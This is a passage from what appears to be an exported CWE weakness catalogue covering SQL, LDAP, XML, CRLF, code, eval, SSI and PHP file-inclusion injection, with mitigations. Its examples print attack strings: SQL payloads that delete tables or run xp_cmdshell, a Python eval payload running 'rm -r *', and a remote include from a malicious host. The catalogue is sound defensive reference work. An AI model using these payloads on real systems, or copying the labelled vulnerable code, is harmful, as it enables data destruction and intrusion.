database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example.If an attacker enters the string(attack code)name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='aThen the following three valid statements will be created:(attack code)SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';DELETE FROM items;SELECT * FROM items WHERE 'a'='a';One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allowlist of safe values or identify and escape a denylist of potentially malicious values. Allowlists can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, denylisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:Target fields that are not quotedFind ways to bypass the need for certain escaped meta-charactersUse stored procedures to hide the injected meta-characters.Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.(bad code)procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)is open itm_cv for' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';end get_item;Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.Example 4MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:(bad code)SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICEWhere $user_input is taken from an untrusted source.If the user provides the string:(attack code)'; exec master..xp_cmdshell 'dir' --The query will take the following form:(attack code)SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICENow, this query can be broken down into:a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'an MS SQL comment: --' ORDER BY PRICEAs can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment.Example 5This code intends to print a message summary given the message ID.(bad code)Example Language:PHP$id = $_COOKIE[""mid""];mysql_query(""SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'"");The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser.While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:(attack code)1432' or '1' = '1This would produce the resulting query:(result)SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'Not only will this retrieve message number 1432, it will retrieve all other messages.In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:(good code)Example Language:PHP$id = intval($_COOKIE[""mid""]);mysql_query(""SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'"");However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message.Example 6This example attempts to take a last name provided by a user and enter it into a database.(bad code)Example Language:Perl$userKey = getUserID();$name = getUserInput();# ensure only letters, hyphens and apostrophe are allowed$name = allowList($name, ""^a-zA-z'-$"");$query = ""INSERT INTO last_names VALUES('$userKey', '$name')"";While the programmer applies an allowlist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens, which are used as comment structures in SQL. If a user specifies ""--"" then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the allowlist permits the apostrophe, which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.","Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.Phase:  Architecture and DesignStrategy:  ParameterizationIf available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using ""exec"" or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When constructing SQL query strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name ""O'Reilly"" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the ""'"" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.Phase:  ImplementationEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.Phase:  OperationStrategy:  FirewallUse an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.Effectiveness: ModerateNote:An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.Phases:  Operation; ImplementationStrategy:  Environment HardeningWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such asCWE-95,CWE-621, and similar issues."
CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection'),"The product constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Read Application Data; Modify Application DataAn attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior., Likelihood: ","Example 1The code below constructs an LDAP query using user input address data:(bad code)Example Language:Javacontext = new InitialDirContext(env);String searchFilter = ""StreetAddress="" + address;NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries.","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."
CWE-91: XML Injection (aka Blind XPath Injection),"The product does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Read Application Data; Modify Application Data, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."
CWE-92: DEPRECATED: Improper Sanitization of Custom Special Characters,"This entry has been deprecated. It originally came from PLOVER, which sometimes defined ""other"" and ""miscellaneous"" categories in order to satisfy exhaustiveness requirements for taxonomies. Within the context of CWE, the use of a more abstract entry is preferred in mapping situations.CWE-75is a more appropriate mapping.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection'),"The product uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.","Scope: Integrity, Impact: Technical Impact:Modify Application Data, Likelihood: ","Example 1If user input data that eventually makes it to a log message isn't checked for CRLF characters, it may be possible for an attacker to forge entries in a log file.(bad code)Example Language:Javalogger.info(""User's street address: "" + request.getParameter(""streetAddress""));",Phase:  ImplementationAvoid using CRLF as a special sequence.Phase:  ImplementationAppropriately filter or quote CRLF sequences in user-controlled input.
CWE-94: Improper Control of Generation of Code ('Code Injection'),"The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIn some cases, injectable code controls authentication; this may lead to a remote vulnerability., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityInjected code can access resources that the attacker is directly prevented from accessing., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsCode injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesOften the actions performed by injected control code are unlogged., Likelihood: ","Example 1This example attempts to write user messages to a message file and allow users to view them.(bad code)Example Language:PHP$MessageFile = ""messages.out"";if ($_GET[""action""] == ""NewMessage"") {$name = $_GET[""name""];$message = $_GET[""message""];$handle = fopen($MessageFile, ""a+"");fwrite($handle, ""<b>$name</b> says '$message'<hr>\n"");fclose($handle);echo ""Message Saved!<p>\n"";}else if ($_GET[""action""] == ""ViewMessages"") {include($MessageFile);}While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:(attack code)name=h4x0rmessage=%3C?php%20system(%22/bin/ls%20-l%22);?%3Ewhich will decode to the following:(attack code)<?php system(""/bin/ls -l"");?>The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.Notice that XSS (CWE-79) is also possible in this situation.Example 2edit-config.pl: This CGI script is used to modify settings in a configuration file.(bad code)Example Language:Perluse CGI qw(:standard);sub config_file_add_key {my ($fname, $key, $arg) = @_;# code to add a field/key to a file goes here}sub config_file_set_key {my ($fname, $key, $arg) = @_;# code to set key to a particular file goes here}sub config_file_delete_key {my ($fname, $key, $arg) = @_;# code to delete key from a particular file goes here}sub handleConfigAction {my ($fname, $action) = @_;my $key = param('key');my $val = param('val');# this is super-efficient code, especially if you have to invoke# any one of dozens of different functions!my $code = ""config_file_$action_key(\$fname, \$key, \$val);"";eval($code);}$configfile = ""/home/cwe/config.txt"";print header;if (defined(param('action'))) {handleConfigAction($configfile, param('action'));}else {print ""No action specified!\n"";}The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:(attack code)add_key("","",""); system(""/bin/ls"");This would produce the following string in handleConfigAction():(result)config_file_add_key("","",""); system(""/bin/ls"");Any arbitrary Perl code could be added after the attacker has ""closed off"" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the ""_key(\$fname, \$key, \$val)"" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.Example 3This simple script asks a user to supply a list of numbers as input and adds them together.(bad code)Example Language:Pythondef main():sum = 0numbers = eval(input(""Enter a space-separated list of numbers: ""))for num in numbers:sum = sum + numprint(f""Sum of {numbers} = {sum}"")main()The eval() function can take the user-supplied list and convert it into a Python list object, therefore allowing the programmer to use list comprehension methods to work with the data. However, if code is supplied to the eval() function, it will execute that code. For example, a malicious user could supply the following string:(attack code)__import__('subprocess').getoutput('rm -r *')This would delete all the files in the current directory. For this reason, it is not recommended to use eval() with untrusted input.A way to accomplish this without the use of eval() is to apply an integer conversion on the input within a try/except block. If the user-supplied input is not numeric, this will raise a ValueError. By avoiding eval(), there is no opportunity for the input string to be executed as code.(good code)Example Language:Pythondef main():sum = 0numbers = input(""Enter a space-separated list of numbers: "").split("" "")try:for num in numbers:sum = sum + int(num)print(f""Sum of {numbers} = {sum}"")except ValueError:print(""Error: invalid input"")main()An alternative, commonly-cited mitigation for this kind of weakness is to use the ast.literal_eval() function, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].","Phase:  Architecture and DesignRefactor your program so that you do not have to dynamically generate code.Phase:  Architecture and DesignRun your code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your product.Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.To reduce the likelihood of code injection, use stringent allowlists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().Phase:  TestingUse automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.Phase:  TestingUse dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.Phase:  OperationStrategy:  Compilation or Build HardeningRun the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's ""-T"" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (seeCWE-183andCWE-184).Phase:  OperationStrategy:  Environment HardeningRun the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's ""-T"" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (seeCWE-183andCWE-184).Phase:  ImplementationFor Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].Effectiveness: Discouraged Common Practice"
CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection'),"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. ""eval"").","Scope: Confidentiality, Impact: Technical Impact:Read Files or Directories; Read Application DataThe injected code could access restricted data / files., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIn some cases, injectable code controls authentication; this may lead to a remote vulnerability., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityInjected code can access resources that the attacker is directly prevented from accessing., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityOther, Impact: Technical Impact:Execute Unauthorized Code or CommandsCode injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesOften the actions performed by injected control code are unlogged., Likelihood: ","Example 1edit-config.pl: This CGI script is used to modify settings in a configuration file.(bad code)Example Language:Perluse CGI qw(:standard);sub config_file_add_key {my ($fname, $key, $arg) = @_;# code to add a field/key to a file goes here}sub config_file_set_key {my ($fname, $key, $arg) = @_;# code to set key to a particular file goes here}sub config_file_delete_key {my ($fname, $key, $arg) = @_;# code to delete key from a particular file goes here}sub handleConfigAction {my ($fname, $action) = @_;my $key = param('key');my $val = param('val');# this is super-efficient code, especially if you have to invoke# any one of dozens of different functions!my $code = ""config_file_$action_key(\$fname, \$key, \$val);"";eval($code);}$configfile = ""/home/cwe/config.txt"";print header;if (defined(param('action'))) {handleConfigAction($configfile, param('action'));}else {print ""No action specified!\n"";}The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:(attack code)add_key("","",""); system(""/bin/ls"");This would produce the following string in handleConfigAction():(result)config_file_add_key("","",""); system(""/bin/ls"");Any arbitrary Perl code could be added after the attacker has ""closed off"" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the ""_key(\$fname, \$key, \$val)"" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.Example 2This simple script asks a user to supply a list of numbers as input and adds them together.(bad code)Example Language:Pythondef main():sum = 0numbers = eval(input(""Enter a space-separated list of numbers: ""))for num in numbers:sum = sum + numprint(f""Sum of {numbers} = {sum}"")main()The eval() function can take the user-supplied list and convert it into a Python list object, therefore allowing the programmer to use list comprehension methods to work with the data. However, if code is supplied to the eval() function, it will execute that code. For example, a malicious user could supply the following string:(attack code)__import__('subprocess').getoutput('rm -r *')This would delete all the files in the current directory. For this reason, it is not recommended to use eval() with untrusted input.A way to accomplish this without the use of eval() is to apply an integer conversion on the input within a try/except block. If the user-supplied input is not numeric, this will raise a ValueError. By avoiding eval(), there is no opportunity for the input string to be executed as code.(good code)Example Language:Pythondef main():sum = 0numbers = input(""Enter a space-separated list of numbers: "").split("" "")try:for num in numbers:sum = sum + int(num)print(f""Sum of {numbers} = {sum}"")except ValueError:print(""Error: invalid input"")main()An alternative, commonly-cited mitigation for this kind of weakness is to use the ast.literal_eval() function, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].","Phases:  Architecture and Design; ImplementationIf possible, refactor your code so that it does not need to use eval() at all.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180,CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.Phase:  ImplementationFor Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].Effectiveness: Discouraged Common Practice"
CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection'),"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template.","Scope: Confidentiality, Impact: Technical Impact:Read Files or Directories; Read Application DataThe injected code could access restricted data / files., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIn some cases, injectable code controls authentication; this may lead to a remote vulnerability., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityInjected code can access resources that the attacker is directly prevented from accessing., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityOther, Impact: Technical Impact:Execute Unauthorized Code or CommandsCode injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesOften the actions performed by injected control code are unlogged., Likelihood: ","Example 1This example attempts to write user messages to a message file and allow users to view them.(bad code)Example Language:PHP$MessageFile = ""messages.out"";if ($_GET[""action""] == ""NewMessage"") {$name = $_GET[""name""];$message = $_GET[""message""];$handle = fopen($MessageFile, ""a+"");fwrite($handle, ""<b>$name</b> says '$message'<hr>\n"");fclose($handle);echo ""Message Saved!<p>\n"";}else if ($_GET[""action""] == ""ViewMessages"") {include($MessageFile);}While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:(attack code)name=h4x0rmessage=%3C?php%20system(%22/bin/ls%20-l%22);?%3Ewhich will decode to the following:(attack code)<?php system(""/bin/ls -l"");?>The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.Notice that XSS (CWE-79) is also possible in this situation.","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingPerform proper output validation and escaping to neutralize all code syntax from data written to code files."
CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page,"The product generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,无可能的缓解方案
CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion'),"The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in ""require,"" ""include,"" or similar functions.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsThe attacker may be able to specify arbitrary code to be executed from a remote location. Alternatively, it may be possible to use normal program behavior to insert php code into files on the local machine which can then be included and force the code to execute since php ignores everything in the file except for the content between php specifiers., Likelihood: ","Example 1The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it.(bad code)Example Language:PHP$dir = $_GET['module_name'];include($dir . ""/function.php"");The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the 'module_name' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a 'module_name' of ""http://malicious.example.com"" by using the following request string:(attack code)victim.php?module_name=http://malicious.example.comUpon receiving this request, the code would set 'module_name' to the value ""http://malicious.example.com"" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains.For the sake of this example, assume that the malicious version of function.php looks like the following:(bad code)system($_GET['cmd']);An attacker could now go a step further in our example and provide a request string as follows:(attack code)victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-lThe code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:(attack code)/bin/ls -lNote that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations.","Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.For example, ID 1 could map to ""inbox.txt"" and ID 2 could map to ""profile.txt"". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of 